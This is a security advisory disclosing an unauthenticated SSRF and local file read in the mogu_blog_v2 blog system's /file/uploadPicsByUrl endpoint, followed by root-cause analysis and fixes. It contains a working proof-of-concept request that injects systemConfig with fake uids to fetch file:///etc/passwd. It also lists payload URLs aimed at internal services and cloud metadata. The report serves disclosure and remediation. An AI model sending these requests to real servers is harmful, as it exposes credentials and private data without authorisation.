# Unauthenticated SSRF and Local File Read in mogu_blog_v2 via /file/uploadPicsByUrl

## Vulnerability Overview

**Submitter**: sh7err@vEcho

mogu_blog_v2 is a microservice-based front-end and back-end separated blog system. A critical security vulnerability has been identified in the file upload functionality that allows unauthenticated attackers to perform Server-Side Request Forgery (SSRF) attacks and read arbitrary local files from the server.

## Affected Component

- **Project**: mogu_blog_v2
- **Vendor**: moxi159753
- **Affected Endpoint**: `/file/uploadPicsByUrl`
- **Affected Files**:
  - `mogu_picture/src/main/java/com/moxi/mogublog/picture/restapi/FileRestApi.java` (lines 95-99)
  - `mogu_picture/src/main/java/com/moxi/mogublog/picture/service/impl/FileServiceImpl.java` (lines 261-336)
  - `mogu_picture/src/main/java/com/moxi/mogublog/picture/service/impl/LocalFileServiceImpl.java` (lines 62-127)
  - `mogu_picture/src/main/java/com/moxi/mogublog/picture/config/WebSecurityConfig.java` (lines 50-55)

## Vulnerability Details

### Root Cause

The vulnerability exists due to multiple security weaknesses:

1. **Insufficient Authentication**: The `/file/**` endpoint pattern is configured with `permitAll()` in Spring Security configuration, allowing unauthenticated access.

2. **Missing Authorization Validation**: The `uploadPictureByUrl` method only checks if `userUid` or `adminUid` fields are non-empty (FileServiceImpl.java:282-284) but does not verify their authenticity against the database.

3. **Configuration Injection**: Attackers can inject arbitrary `systemConfig` parameters in the request body to bypass token validation and control upload behavior.

4. **Unrestricted URL Fetching**: The `LocalFileServiceImpl.uploadPictureByUrl` method uses `new URL(itemUrl)` followed by `URLConnection.getInputStream()` (LocalFileServiceImpl.java:95-104) without any protocol, host, or path restrictions.

### Attack Vector

An attacker can exploit this vulnerability by:

1. Sending a POST request to `/file/uploadPicsByUrl` without authentication
2. Providing fake `userUid`/`adminUid` values that only need to be non-empty strings
3. Injecting a `systemConfig` object in the request body to control upload settings
4. Supplying malicious URLs in the `urlList` parameter, including:
   - `file:///etc/passwd` to read local files
   - `http://127.0.0.1:8080/admin/...` to access internal services
   - `http://169.254.169.254/latest/meta-data/` to retrieve cloud metadata

The fetched content is then saved to a publicly accessible static directory and the URL is returned in the response, allowing the attacker to download sensitive data.

## Proof of Concept

### Request

```http
POST /file/uploadPicsByUrl HTTP/1.1
Host: target-server.com
Content-Type: application/json

{
  "userUid": "uid00000000000000000000000000000",
  "adminUid": "uid00000000000000000000000000000",
  "projectName": "base",
  "sortName": "admin",
  "urlList": ["file:///etc/passwd"],
  "systemConfig": {
    "uploadLocal": "OPEN",
    "uploadQiNiu": "CLOSE",
    "uploadMinio": "CLOSE",
    "localPictureBaseUrl": "http://target-server.com/",
    "picturePriority": "LOCAL",
    "contentPicturePriority": "LOCAL"
  }
}
```

### Response

```json
{
  "success": true,
  "data": [{
    "picUrl": "base/admin/jpg/2024/06/03/1717390000000.jpg",
    ...
  }]
}
```

### Exploitation

Access `http://target-server.com/base/admin/jpg/2024/06/03/1717390000000.jpg` to retrieve the contents of `/etc/passwd`.

## Impact

This vulnerability has **CRITICAL** severity and allows attackers to:

1. **Read Arbitrary Local Files**: Access sensitive configuration files, application source code, credentials, and private keys
2. **Perform Internal Network Reconnaissance**: Scan and interact with internal services not exposed to the internet
3. **Access Cloud Metadata Services**: Retrieve AWS/Azure/GCP credentials and configuration data
4. **Bypass Authentication Completely**: No credentials required to exploit

The combination of SSRF and arbitrary file read significantly compromises the confidentiality and integrity of the entire system.

## Affected Versions

All versions of mogu_blog_v2 in the current repository are affected. The vulnerability exists in both Eureka and Nacos branches.

## Recommendations

1. **Remove Public Access**: Change `/file/**` from `permitAll()` to require authentication in `WebSecurityConfig.java`
2. **Validate User Identity**: Verify `userUid`/`adminUid` against the database instead of accepting arbitrary values
3. **Remove Configuration Injection**: Do not allow `systemConfig` to be provided in request bodies; always fetch from trusted sources
4. **Implement URL Whitelist**: Only allow `http` and `https` protocols from trusted domains
5. **Disable Dangerous Protocols**: Block `file://`, `ftp://`, `gopher://`, and other non-HTTP protocols
6. **Add Response Type Validation**: Verify fetched content matches expected file types before saving
7. **Consider Removing Feature**: If URL-based uploads are not essential, disable this functionality entirely

## References

- Repository: https://gitee.com/moxi159753/mogu_blog_v2
- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- OWASP: Server-Side Request Forgery Prevention Cheat Sheet
